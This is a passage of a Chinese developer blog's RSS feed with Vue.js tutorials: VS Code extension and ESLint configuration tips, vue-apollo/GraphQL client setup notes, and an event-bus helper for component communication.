      <category>vuejs</category>
      <pubDate>Sun, 16 Feb 2020 13:19:19 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>学习 vue.js 的小伙伴前期一定很苦恼吧, 接下这篇文章带你从配置编辑器入手, 提升你的代码开发效率, 保证代码的整洁度, 让你感受到写代码也能飞起来。主要是推荐几款我本人用起来比较方便的 vscode 插件, 以及这些插件的简单配置。</p>
</div>

<h2 id="先了解-vue-js-的代码风格" tabindex="-1"> 先了解 Vue.js 的代码风格</h2>
<p>这里比较推荐的是, 官方提供的代码风格, 上地址 <a href="https://cn.vuejs.org/v2/style-guide/" target="_blank" rel="noopener noreferrer">风格指南</a></p>
<p>懒癌晚期的同志们看完之后, 一定会觉得这什么呀, 怎么这么多, 只是想愉快的写代码并不想关心这些无谓的代码风格, 那么到底有没有插件帮助这些懒癌晚期又有强迫症的童鞋的 vscode 插件呢？答案当然是有的啦, 接着向下看</p>
<h2 id="vue-js-项目代码开启-eslint" tabindex="-1"> Vue.js 项目代码开启 ESlint</h2>
<p>通常使用 <code>vue create [projectName]</code> 创建项目时会询问你使用哪种风格的 ESlint, 这时候你就应该毫不犹豫的选择 <code>ESLint + Standard config</code> 这种风格, 因为这种风格的代码更符合官方推荐的代码风格</p>
<p><img src="/assets/vscode-config-1.png" alt="vscode-config"></p>
<p>当然对于强迫症的童鞋这些是不够的, 能够更加符合官方推荐风格指南你还需要阅读 <a href="https://eslint.vuejs.org/rules/" target="_blank" rel="noopener noreferrer">eslint-plugin-vue</a></p>
<p>不用担心你的项目没有安装 <code>eslint-plugin-vue</code> 这一插件, 因为官方已经帮助我们集成了, 我们只需进行简单的配置即可</p>
<p>默认生成的项目 eslint 检测规则是这样的, 米娜桑可以查阅项目目录下的 <code>.eslintrc.js</code></p>
<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>
  <span>root</span><span>:</span> <span>true</span><span>,</span>
  <span>env</span><span>:</span> <span>{</span>
    <span>node</span><span>:</span> <span>true</span><span>,</span>
  <span>}</span><span>,</span>
  <span>extends</span><span>:</span> <span>[</span><span>"plugin:vue/essential"</span><span>,</span> <span>"@vue/standard"</span><span>]</span><span>,</span>
  <span>parserOptions</span><span>:</span> <span>{</span>
    <span>parser</span><span>:</span> <span>"babel-eslint"</span><span>,</span>
  <span>}</span><span>,</span>
  <span>rules</span><span>:</span> <span>{</span>
    <span>"no-console"</span><span>:</span> process<span>.</span>env<span>.</span><span>NODE_ENV</span> <span>===</span> <span>"production"</span> <span>?</span> <span>"error"</span> <span>:</span> <span>"off"</span><span>,</span>
    <span>"no-debugger"</span><span>:</span> process<span>.</span>env<span>.</span><span>NODE_ENV</span> <span>===</span> <span>"production"</span> <span>?</span> <span>"error"</span> <span>:</span> <span>"off"</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>仔细看看, 这个规则只是开启了官方推荐的风格指南中的 A 级风格, 那么想要开启 B 级风格以及 C 级风格要如何做呢？前面让大家阅读的 <a href="https://eslint.vuejs.org/rules/" target="_blank" rel="noopener noreferrer">eslint-plugin-vue</a> 这个就派上用场了, 查阅这里的配置指南, 配置出符合自己团队的代码风格</p>
<p>下面贴出我个人使用的代码风格配置（强迫症患者福音）</p>
<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>
  <span>root</span><span>:</span> <span>true</span><span>,</span>
  <span>env</span><span>:</span> <span>{</span>
    <span>node</span><span>:</span> <span>true</span><span>,</span>
  <span>}</span><span>,</span>
  <span>extends</span><span>:</span> <span>[</span>
    <span>// 配置参考 https://eslint.vuejs.org/rules/</span>
    <span>"plugin:vue/base"</span><span>,</span>
    <span>"plugin:vue/essential"</span><span>,</span>
    <span>"plugin:vue/strongly-recommended"</span><span>,</span>
    <span>"plugin:vue/recommended"</span><span>,</span>
    <span>"@vue/standard"</span><span>,</span>
  <span>]</span><span>,</span>
  <span>rules</span><span>:</span> <span>{</span>
    <span>// 以下风格参照 https://cn.vuejs.org/v2/style-guide/index.html</span>
    <span>"no-console"</span><span>:</span> process<span>.</span>env<span>.</span><span>NODE_ENV</span> <span>===</span> <span>"production"</span> <span>?</span> <span>"error"</span> <span>:</span> <span>"off"</span><span>,</span>
    <span>"no-debugger"</span><span>:</span> process<span>.</span>env<span>.</span><span>NODE_ENV</span> <span>===</span> <span>"production"</span> <span>?</span> <span>"error"</span> <span>:</span> <span>"off"</span><span>,</span>
    <span>// 配置参考 https://eslint.vuejs.org/rules/</span>
    <span>"vue/attributes-order"</span><span>:</span> <span>[</span>
      <span>"error"</span><span>,</span>
      <span>{</span>
        <span>order</span><span>:</span> <span>[</span>
          <span>"DEFINITION"</span><span>,</span> <span>// e.g. 'is'</span>
          <span>"LIST_RENDERING"</span><span>,</span> <span>// e.g. 'v-for item in items'</span>
          <span>"CONDITIONALS"</span><span>,</span> <span>// e.g. 'v-if', 'v-else-if', 'v-else', 'v-show', 'v-cloak'</span>
          <span>"RENDER_MODIFIERS"</span><span>,</span> <span>// e.g. 'v-once', 'v-pre'</span>
          <span>"GLOBAL"</span><span>,</span> <span>// e.g. 'id'</span>
          <span>"UNIQUE"</span><span>,</span> <span>// e.g. 'ref', 'key', 'v-slot', 'slot'</span>
          <span>"TWO_WAY_BINDING"</span><span>,</span> <span>// e.g. 'v-model'</span>
          <span>"OTHER_DIRECTIVES"</span><span>,</span> <span>// e.g. 'v-custom-directive'</span>
          <span>"OTHER_ATTR"</span><span>,</span> <span>//  e.g. 'custom-prop="foo"', 'v-bind:prop="foo"', ':prop="foo"'</span>
          <span>"EVENTS"</span><span>,</span> <span>// e.g. '@click="functionCall"', 'v-on="event"'</span>
          <span>"CONTENT"</span><span>,</span> <span>// e.g. 'v-text', 'v-html'</span>
        <span>]</span><span>,</span>
      <span>}</span><span>,</span>
    <span>]</span><span>,</span>
    <span>"vue/order-in-components"</span><span>:</span> <span>[</span>
      <span>"error"</span><span>,</span>
      <span>{</span>
        <span>order</span><span>:</span> <span>[</span>
          <span>"el"</span><span>,</span>
          <span>"name"</span><span>,</span>
          <span>"parent"</span><span>,</span>
          <span>"functional"</span><span>,</span>
          <span>[</span><span>"delimiters"</span><span>,</span> <span>"comments"</span><span>]</span><span>,</span>
          <span>[</span><span>"components"</span><span>,</span> <span>"directives"</span><span>,</span> <span>"filters"</span><span>]</span><span>,</span>
          <span>"extends"</span><span>,</span>
          <span>"mixins"</span><span>,</span>
          <span>"inheritAttrs"</span><span>,</span>
          <span>"model"</span><span>,</span>
          <span>[</span><span>"props"</span><span>,</span> <span>"propsData"</span><span>]</span><span>,</span>
          <span>"fetch"</span><span>,</span>
          <span>"asyncData"</span><span>,</span>
          <span>"data"</span><span>,</span>
          <span>"computed"</span><span>,</span>
          <span>"watch"</span><span>,</span>
          <span>"LIFECYCLE_HOOKS"</span><span>,</span>
          <span>"methods"</span><span>,</span>
          <span>"head"</span><span>,</span>
          <span>[</span><span>"template"</span><span>,</span> <span>"render"</span><span>]</span><span>,</span>
          <span>"renderError"</span><span>,</span>
        <span>]</span><span>,</span>
      <span>}</span><span>,</span>
    <span>]</span><span>,</span>
    <span>"vue/no-v-html"</span><span>:</span> <span>"off"</span><span>,</span>
    <span>"vue/array-bracket-spacing"</span><span>:</span> <span>"error"</span><span>,</span>
    <span>"vue/arrow-spacing"</span><span>:</span> <span>"error"</span><span>,</span>
    <span>"vue/block-spacing"</span><span>:</span> <span>"error"</span><span>,</span>
    <span>"vue/camelcase"</span><span>:</span> <span>"error"</span><span>,</span>
    <span>"vue/comma-dangle"</span><span>:</span> <span>"error"</span><span>,</span>
    <span>"vue/component-name-in-template-casing"</span><span>:</span> <span>[</span>
      <span>"error"</span><span>,</span>
      <span>"kebab-case"</span><span>,</span>
      <span>{</span>
        <span>registeredComponentsOnly</span><span>:</span> <span>false</span><span>,</span>
        <span>ignores</span><span>:</span> <span>[</span><span>]</span><span>,</span>
      <span>}</span><span>,</span>
    <span>]</span><span>,</span>
    <span>"vue/eqeqeq"</span><span>:</span> <span>"error"</span><span>,</span>
    <span>"vue/key-spacing"</span><span>:</span> <span>"error"</span><span>,</span>
    <span>"vue/match-component-file-name"</span><span>:</span> <span>[</span>
      <span>"error"</span><span>,</span>
      <span>{</span>
        <span>extensions</span><span>:</span> <span>[</span><span>"jsx"</span><span>]</span><span>,</span>
        <span>shouldMatchCase</span><span>:</span> <span>false</span><span>,</span>
      <span>}</span><span>,</span>
    <span>]</span><span>,</span>
    <span>"vue/no-restricted-syntax"</span><span>:</span> <span>"error"</span><span>,</span>
    <span>"vue/object-curly-spacing"</span><span>:</span> <span>"error"</span><span>,</span>
    <span>"vue/require-direct-export"</span><span>:</span> <span>"error"</span><span>,</span>
    <span>"vue/space-infix-ops"</span><span>:</span> <span>"error"</span><span>,</span>
    <span>"vue/space-unary-ops"</span><span>:</span> <span>"error"</span><span>,</span>
    <span>"vue/v-on-function-call"</span><span>:</span> <span>[</span><span>"error"</span><span>,</span> <span>"never"</span><span>]</span><span>,</span>
  <span>}</span><span>,</span>
  <span>parserOptions</span><span>:</span> <span>{</span>
    <span>parser</span><span>:</span> <span>"babel-eslint"</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>小结</p>
<p>这一节呢, 主要是介绍项目的 ESlint 配置指南, 但是这些配置项对于懒癌晚期的同志们, 真是让他们一个脑袋两个大, 不要急, 看完下面的插件安利, 你会跪下来喊爸爸的</p>
</div>
<h2 id="vscode-插件推荐" tabindex="-1"> vscode 插件推荐</h2>
<h3 id="vetur" tabindex="-1"> Vetur</h3>
<div><p>插件介绍</p>
<p>这个插件是 vue.js 官方团队开发的 vue.js 语法高亮的一款插件</p>
</div>
<p><a href="https://marketplace.visualstudio.com/items?itemName=octref.vetur" target="_blank" rel="noopener noreferrer">Vetur 插件安装地址</a></p>
<p>无需进行过多的配置, 基本上默认的就足够了, 这边推荐的是修改以下这一配置项</p>
<p><img src="/assets/vscode-config-2.png" alt="vscode-config"></p>
<h3 id="eslint" tabindex="-1"> ESlint</h3>
<div><p>插件介绍</p>
<p>保证你的代码整洁度的灵魂插件, 配置完成之后即可感受到写代码飞起来</p>
</div>
<p><a href="https://marketplace.visualstudio.com/items?itemName=dbaeumer.vscode-eslint" target="_blank" rel="noopener noreferrer">ESlint 插件安装地址</a></p>
<p>配置项需要在 <code>settings.json</code> 中添加配置项的, 以下贴出推荐的配置</p>
<div><pre><code><span>{</span>
  <span>"eslint.autoFixOnSave"</span><span>:</span> <span>true</span><span>,</span>
  <span>"eslint.validate"</span><span>:</span> <span>[</span>
    <span>"javascript"</span><span>,</span>
    <span>"javascriptreact"</span><span>,</span>
    <span>{</span>
      <span>"language"</span><span>:</span> <span>"html"</span><span>,</span>
      <span>"autoFix"</span><span>:</span> <span>true</span>
    <span>}</span><span>,</span>
    <span>{</span>
      <span>"language"</span><span>:</span> <span>"vue"</span><span>,</span>
      <span>"autoFix"</span><span>:</span> <span>true</span>
    <span>}</span><span>,</span>
    <span>"html"</span><span>,</span>
    <span>"vue"</span>
  <span>]</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>这边再贴一段关于自动保存即可格式化你的代码配置</p>
<div><pre><code><span>{</span>
  <span>"eslint.autoFixOnSave"</span><span>:</span> <span>true</span><span>,</span>
  <span>"files.autoSaveDelay"</span><span>:</span> <span>500</span><span>,</span>
  <span>"files.autoSave"</span><span>:</span> <span>"onFocusChange"</span><span>,</span>
  <span>"editor.codeActionsOnSave"</span><span>:</span> <span>{</span>
    <span>"source.fixAll.eslint"</span><span>:</span> <span>true</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>小结</p>
<p>基本上配置这些就足够提升写代码的效率了, 不用再去强行记忆那些所谓的代码风格, 使你更加关注于写代码带来的快乐</p>
</div>
<h3 id="beautify" tabindex="-1"> Beautify</h3>
<div><p>插件介绍</p>
<p>这是配合 ESlint 的一款代码格式化插件, 无需额外的配置</p>
</div>
<p><a href="https://marketplace.visualstudio.com/items?itemName=HookyQR.beautify" target="_blank" rel="noopener noreferrer">Beautify 插件安装地址</a></p>
<h3 id="add-jsdoc-comments" tabindex="-1"> Add jsdoc comments</h3>
<div><p>插件介绍</p>
<p>这是用于编写 javascript 注释文档的辅助插件, 无需额外的配置</p>
</div>
<p><a href="https://marketplace.visualstudio.com/items?itemName=stevencl.addDocComments" target="_blank" rel="noopener noreferrer">Add jsdoc comments 插件安装地址</a></p>
<h3 id="auto-close-tag" tabindex="-1"> Auto Close tag</h3>
<div><p>插件介绍</p>
<p>自动闭合 HTML 标签的插件, 无需额外的配置</p>
</div>
<p><a href="https://marketplace.visualstudio.com/items?itemName=formulahendry.auto-close-tag" target="_blank" rel="noopener noreferrer">Auto Close tag 插件安装地址</a></p>
<h3 id="auto-rename-tag" tabindex="-1"> Auto Rename Tag</h3>
<div><p>插件介绍</p>
<p>自动重命名 HTML 标签的插件, 无需额外的配置</p>
</div>
<p><a href="https://marketplace.visualstudio.com/items?itemName=formulahendry.auto-rename-tag" target="_blank" rel="noopener noreferrer">Auto Rename Tag 插件安装地址</a></p>
<h3 id="bracket-pair-colorizer" tabindex="-1"> Bracket Pair Colorizer</h3>
<div><p>插件介绍</p>
<p>高亮显示括号, 无需额外的配置</p>
</div>
<p><a href="https://marketplace.visualstudio.com/items?itemName=CoenraadS.bracket-pair-colorizer" target="_blank" rel="noopener noreferrer">Bracket Pair Colorizer 插件安装地址</a></p>
<h3 id="color-highlight" tabindex="-1"> Color Highlight</h3>
<div><p>插件介绍</p>
<p>HTML 的颜色值高亮, 无需额外的配置</p>
</div>
<p><a href="https://marketplace.visualstudio.com/items?itemName=naumovs.color-highlight" target="_blank" rel="noopener noreferrer">Color Highlight 插件安装地址</a></p>
<h3 id="gitlens" tabindex="-1"> GitLens</h3>
<div><p>插件介绍</p>
<p>增强 vscode 中的 git 功能, 无需额外的配置</p>
</div>
<p><a href="https://marketplace.visualstudio.com/items?itemName=eamodio.gitlens" target="_blank" rel="noopener noreferrer">GitLens 插件安装地址</a></p>
<h3 id="tabnine" tabindex="-1"> TabNine</h3>
<div><p>插件介绍</p>
<p>使用 AI 帮助你提升写代码效率的一款插件</p>
</div>
<p><a href="https://marketplace.visualstudio.com/items?itemName=TabNine.tabnine-vscode" target="_blank" rel="noopener noreferrer">TabNine 插件安装地址</a></p>
<p>配置过程也很简单, 新建一个文件输入 <code>TabNine::config</code> 会自动开启一个 WEB 配置页面, 按照下图开启配置即可, 至于 <code>Activation key</code> 需要通过邮箱验证来获取的</p>
<p><img src="/assets/vscode-config-3.png" alt="vscode-config"></p>
]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/vscode-config-1.png" type="image/png"/>
    </item>
    <item>
      <title>vue-appollo 技术探索</title>
      <link>https://vxhly.github.io/views/vuejs/vue-apollo.html</link>
      <guid>https://vxhly.github.io/views/vuejs/vue-apollo.html</guid>
      <source url="https://vxhly.github.io/rss.xml">vue-appollo 技术探索</source>
      <description>前言
记录 vue-appollo 的学习笔记.

</description>
      <category>vuejs</category>
      <pubDate>Thu, 10 Jun 2021 09:51:35 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>记录 vue-appollo 的学习笔记.</p>
</div>

<h2 id="简介" tabindex="-1"> 简介</h2>
<h3 id="vue-appollo" tabindex="-1"> vue-appollo</h3>
<h3 id="graphql" tabindex="-1"> GraphQL</h3>
<p><a href="https://graphql.org/" target="_blank" rel="noopener noreferrer">GraphQL</a> 是一种新的 API 的查询语言, 它提供了一种更高效、强大和灵活 API 查询。它是由 Facebook 开发和开源, 目前由来自世界各地的大公司和个人维护。GraphQL 对你的 API 中的数据提供了一套易于理解的完整描述, 使得客户端能够准确地获得它需要的数据, 而且没有任何冗余。它弥补了 RESTful API（字段冗余, 扩展性差、无法聚合 api、无法定义数据类型、网络请求次数多）等不足。</p>
<p>注意：GraphQL 是 api 的查询语言, 而不是数据库。从这个意义上说, 它是数据库无关的, 而且可以在使用 API 的任何环境中有效使用, 我们可以理解为 GraphQL 是基于 API 之上的一层封装, 目的是为了更好, 更灵活的适用于业务的需求变化</p>
<h3 id="apollo" tabindex="-1"> Apollo</h3>
<h4 id="可以解决什么样的问题" tabindex="-1"> 可以解决什么样的问题</h4>
<p>前后端联调接口一直以来都是特别费劲的一个环节, 使用 REST 接口, 接口返回的数据格式, 数据类型（有哪些字段, 字段的类型）都是后端自己预先定义好的, 如果返回的数据格式并不是调用者所期望的, 作为前端的我们可以通过以下两种方式去解决</p>
<ol>
<li>和后端沟通, 该接口（更改数据源）</li>
<li>自己做一些适配工作（处理数据源）</li>
</ol>
<p>有这种经历的人都知道, 让后端改接口这是一个很不现实方案, 尤其是对于三端（web、andriod、ios）公用同一套后端接口的情况下, 让后端改接口的结构基本不可能, 所以一般都是前端自己做一些接口数据的适配工作</p>
<p>其实我们真的很希望, 我们需要什么数据, 需要什么格式, 后端就按照什么格式给我们返回什么样的数据结构, 我们要哪些字段, 后端就只给我们返回我们需要的这些字段, 其他的都不返回, 这样, 前端就和后端解耦了, 我们不用再每天和后端因为接口问题去撕逼, GraphQL 就是一个这样的思路来帮助我们解决这个前后端联调接口的问题, 在前端直接写查询, 后端只管给前端返回前端查询的这些数据；</p>
<h3 id="需要涉及到的依赖包以及参考链接" tabindex="-1"> 需要涉及到的依赖包以及参考链接</h3>
<ol>
<li><a href="https://apollo.vuejs.org/zh-cn/guide/" target="_blank" rel="noopener noreferrer">vue-apollo</a></li>
<li><a href="https://www.apollographql.com/docs/" target="_blank" rel="noopener noreferrer">Apollo</a></li>
<li></li>
</ol>
<h2 id="上手例子一" tabindex="-1"> 上手例子一</h2>
<h3 id="配置-loader" tabindex="-1"> 配置 Loader</h3>
<p>为了帮助我们更简便的调用 GraphQL API, 在使用 GraphQL 时更加方便, 像普通 js 模块一样轻松自如, 使前端开发人员能在 js 文件中通过 import 或 require 导入 <code>.gql</code> 和 <code>.graphql</code> 文件, 然后直接调用, 并且还需要支持通过 <code>#import</code> 语法导入其它 <code>.gql</code> 文件, 比如 <code>fragments</code>。我们在 <code>vue.config.js</code> 中加入以下配置项来配置加载 <code>GraphQL API</code> 文件</p>
<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>
  <span>chainWebpack</span><span>:</span> <span>(</span><span>config</span><span>)</span> <span>=></span> <span>{</span>
    <span>// GraphQL Loader</span>
    config<span>.</span>module
      <span>.</span><span>rule</span><span>(</span><span>"graphql"</span><span>)</span>
      <span>.</span><span>test</span><span>(</span><span><span>/</span><span>\.graphql$</span><span>/</span></span><span>)</span>
      <span>.</span><span>use</span><span>(</span><span>"graphql-tag/loader"</span><span>)</span>
      <span>.</span><span>loader</span><span>(</span><span>"graphql-tag/loader"</span><span>)</span>
      <span>.</span><span>end</span><span>(</span><span>)</span><span>;</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="apollo-客户端连接" tabindex="-1"> apollo 客户端连接</h3>
<p>使用 <code>vue-apollo</code> 与 <code>apollo-boost</code> 创建一个客户端连接</p>
<p><code>apollo-client/index.js</code></p>
<div><pre><code><span>import</span> Vue <span>from</span> <span>"vue"</span><span>;</span>
<span>import</span> ApolloClient <span>from</span> <span>"apollo-boost"</span><span>;</span>
<span>import</span> VueApollo <span>from</span> <span>"vue-apollo"</span><span>;</span>
Vue<span>.</span><span>use</span><span>(</span>VueApollo<span>)</span><span>;</span>

<span>// 创建客户端连接</span>
<span>const</span> apolloClient <span>=</span> <span>new</span> <span>ApolloClient</span><span>(</span><span>{</span>
  <span>// 你需要在这里使用绝对路径</span>
  <span>uri</span><span>:</span> <span>"http://localhost:3000/graphql"</span><span>,</span>
<span>}</span><span>)</span><span>;</span>

<span>// 实例化 appollo 客户端连接</span>
<span>export</span> <span>const</span> apolloProvider <span>=</span> <span>new</span> <span>VueApollo</span><span>(</span><span>{</span>
  <span>defaultClient</span><span>:</span> apolloClient<span>,</span>
<span>}</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>需要在 <code>main.js</code> 中注册</p>
<div><pre><code><span>import</span> Vue <span>from</span> <span>"vue"</span><span>;</span>

<span>import</span> <span>{</span> apolloProvider <span>}</span> <span>from</span> <span>"@/apollo-client"</span><span>;</span>

Vue<span>.</span>config<span>.</span>productionTip <span>=</span> <span>false</span><span>;</span>

<span>new</span> <span>Vue</span><span>(</span><span>{</span>
  apolloProvider<span>,</span>
  <span>render</span><span>:</span> <span>(</span><span>h</span><span>)</span> <span>=></span> <span>h</span><span>(</span>App<span>)</span><span>,</span>
<span>}</span><span>)</span><span>.</span><span>$mount</span><span>(</span><span>"#app"</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Vue.js 发送全局事件（Bus）</title>
      <link>https://vxhly.github.io/views/vuejs/vue-emit-events-by-bus.html</link>
      <guid>https://vxhly.github.io/views/vuejs/vue-emit-events-by-bus.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Vue.js 发送全局事件（Bus）</source>
      <description>前言
vue 1.0 废弃了 vm.$broadcast 和 vm.$dispatch 的 API, 那么在兄弟组件之间进行通信就变的异常为难, 现在就需要一个比较便捷的解决方法。那么, eventBus 的作用就体现出来了, 主要是实现途径是在要相互通信的兄弟组件之中, 都引入一个新的 vue 实例, 然后通过分别调用这个实例的事件触发和监听来实现通信和参数传递。

</description>
      <category>vuejs</category>
      <pubDate>Sat, 19 Jan 2019 13:27:59 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>vue 1.0 废弃了 <code>vm.$broadcast</code> 和 <code>vm.$dispatch</code> 的 API, 那么在兄弟组件之间进行通信就变的异常为难, 现在就需要一个比较便捷的解决方法。那么, eventBus 的作用就体现出来了, 主要是实现途径是在要相互通信的兄弟组件之中, 都引入一个新的 vue 实例, 然后通过分别调用这个实例的事件触发和监听来实现通信和参数传递。</p>
</div>

<h2 id="起因" tabindex="-1"> 起因</h2>
<p>在 vue1.0 中, 组件之间的通信主要通过 <code>vm.$dispatch</code> 沿着父链向上传播和用 <code>vm.$broadcast</code> 向下广播来实现。然而在 vue2.0 中, 已经废除了这种用法。</p>
<p>vuex 加入后, 对组件之间的通信有了更加清晰的操作, 对于中大型的项目来说, 一开始就把 vuex 的使用计划在内是明智的选择。</p>
<p>然而在一些小型的项目, 或者说像我这样写到一半才发现 vue2.0 用不了<code>$.broadcast</code>和<code>$dispatch</code> 的人来说, 就需要一个比较便捷的解决方法。那么, eventBus 的作用就体现出来了。</p>
<p>主要是现实途径是在要相互通信的兄弟组件之中, 都引入一个新的 vue 实例, 然后通过分别调用这个实例的事件触发和监听来实现通信和参数传递。</p>
<h2 id="eventbus-的简介" tabindex="-1"> EventBus 的简介</h2>
<div><p>提示</p>
<p><code>EventBus</code> 又称为事件总线。在 Vue 中可以使用 <code>EventBus</code> 来作为沟通桥梁的概念, 就像是所有组件共用相同的事件中心, 可以向该中心注册发送事件或接收事件, 所以组件都可以上下平行地通知其他组件, 但也就是太方便所以若使用不慎, 就会造成难以维护的灾难, 因此才需要更完善的 Vuex 作为状态管理中心, 将通知的概念上升到共享状态层次。著作权归作者所有。<br> 注意 <code>eventBus</code> 是专门处理 <code>同一个路由下</code> 的复杂组件之间通信的。, 相对于不同路由之间的通信可以考虑使用 <code>vuex</code> 或者 <code>vue-router</code></p>
</div>
<h2 id="更加详细的-vue-组件通信" tabindex="-1"> 更加详细的 vue 组件通信</h2>
<p><a href="https://www.w3cplus.com/vue/component-communication.html" target="_blank" rel="noopener noreferrer">vue 组件的通信</a><br> <a href="https://www.w3cplus.com/vue/event-bus.html" target="_blank" rel="noopener noreferrer">Vue 2.0 学习笔记: 事件总线（EventBus）</a></p>
<h3 id="总结一下-vue-通信的几个方式-和各自的适用场景" tabindex="-1"> 总结一下 Vue 通信的几个方式, 和各自的适用场景</h3>
<ul>
<li>父子组件通信: 父子关系</li>
<li>eventBus 通信 : 同一个路由下, 复杂组件的通信。</li>
<li>Vuex: 全局的、跨越路由、非父子组件的通信都可以用它关系</li>
<li>利用$route 的 params 或者 query: 跨路由的可以用, 但同一个路由下就不适合用了。</li>
<li>localStorage / cookie / sessionStorage: 全局可以用, 但是存储到本地</li>
<li>甚至利用 Vue 实例上添加值 （不建议）</li>
</ul>
<h2 id="封装的-bus-js" tabindex="-1"> 封装的 bus.js</h2>
<p><code>bus.js</code></p>
<div><pre><code><span>import</span> Vue <span>from</span> <span>"vue"</span><span>;</span>
<span>const</span> bus <span>=</span> <span>new</span> <span>Vue</span><span>(</span><span>{</span><span>}</span><span>)</span><span>;</span>
<span>let</span> _on <span>=</span> bus<span>.</span>$on<span>;</span>
<span>let</span> _emit <span>=</span> bus<span>.</span>$emit<span>;</span>
<span>let</span> _off <span>=</span> bus<span>.</span>$off<span>;</span>
bus<span>.</span><span>$on</span> <span>=</span> <span>(</span><span>name<span>,</span> fn</span><span>)</span> <span>=></span> <span>{</span>
  <span>if</span> <span>(</span>bus<span>.</span>_events<span>[</span>name<span>]</span><span>)</span> <span>{</span>
    bus<span>.</span><span>$off</span><span>(</span>name<span>)</span><span>;</span>
  <span>}</span>
  <span>_on</span><span>.</span><span>call</span><span>(</span>bus<span>,</span> name<span>,</span> fn<span>)</span><span>;</span>
<span>}</span><span>;</span>
bus<span>.</span><span>$off</span> <span>=</span> <span>(</span><span>name</span><span>)</span> <span>=></span> <span>{</span>
  <span>if</span> <span>(</span>name <span>&amp;&amp;</span> bus<span>.</span>_events<span>[</span>name<span>]</span><span>)</span> <span>{</span>
    <span>_off</span><span>.</span><span>call</span><span>(</span>bus<span>,</span> name<span>)</span><span>;</span>
  <span>}</span>
<span>}</span><span>;</span>
bus<span>.</span><span>$emit</span> <span>=</span> <span>(</span><span>name<span>,</span> params</span><span>)</span> <span>=></span> <span>{</span>
  <span>if</span> <span>(</span><span>!</span>params <span>||</span> <span>!</span>params<span>.</span>from<span>)</span> <span>{</span>
    console<span>.</span>warn <span>&amp;&amp;</span> console<span>.</span><span>warn</span><span>(</span><span>"The paramter(from) is null"</span><span>)</span><span>;</span>
  <span>}</span>
  <span>_emit</span><span>.</span><span>call</span><span>(</span>bus<span>,</span> name<span>,</span> params<span>)</span><span>;</span>
<span>}</span><span>;</span>
<span>export</span> <span>default</span> bus<span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>main.js</code></p>
<div><pre><code><span>import</span> Vue <span>from</span> <span>"vue"</span><span>;</span>
<span>import</span> bus <span>from</span> <span>"@/utils/bus"</span><span>;</span>
<span>Vue</span><span>.</span>prototype<span>.</span>$bus <span>=</span> bus<span>;</span>
<span>new</span> <span>Vue</span><span>(</span><span>{</span>
  <span>el</span><span>:</span> <span>"#app"</span><span>,</span>
  <span>components</span><span>:</span> <span>{</span>
    App<span>,</span>
  <span>}</span><span>,</span>
  <span>template</span><span>:</span> <span>"&lt;App/>"</span><span>,</span>
<span>}</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="食用栗子" tabindex="-1"> 食用栗子</h2>
<p><code>a.vue</code></p>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span><span>></span></span>
    <span><span><span>&lt;</span>button</span> <span>@click</span><span><span>=</span><span>"</span>onClick<span>"</span></span><span>></span></span>按钮<span><span><span>&lt;/</span>button</span><span>></span></span>
  <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
  <span>export</span> <span>default</span> <span>{</span>
    <span>name</span><span>:</span> <span>"a"</span><span>,</span>
    <span>methods</span><span>:</span> <span>{</span>
      <span>onClick</span><span>(</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>$bus<span>.</span><span>$emit</span><span>(</span><span>"event"</span><span>,</span> <span>{</span>
          <span>from</span><span>:</span> <span>"a"</span><span>,</span>
